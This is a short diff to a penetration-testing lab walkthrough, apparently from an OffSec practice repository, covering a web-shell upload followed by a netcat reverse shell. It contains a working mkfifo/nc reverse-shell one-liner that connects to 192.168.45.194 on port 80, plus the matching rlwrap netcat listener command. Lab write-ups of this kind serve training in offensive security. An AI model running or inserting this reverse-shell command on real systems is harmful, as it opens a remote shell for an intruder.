@@ -234,7 +234,15 @@ Upload Web Shell
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/add10e6c-5c6b-4059-a264-d24521e4da30)
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/98c5648f-8d9d-4bbe-8361-315dbc58b2f5)
 
-Upload Netcat Reverse Shell
+Netcat Reverse Shell
+Execute:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.194 80 >/tmp/f
 ```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/64422833-563a-4df4-88f3-cc1235614da4)
+
+```
+> rlwrap nc -nlvvp 80
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/0dac6902-0627-447a-8f9e-58f1299a2ee5)
+
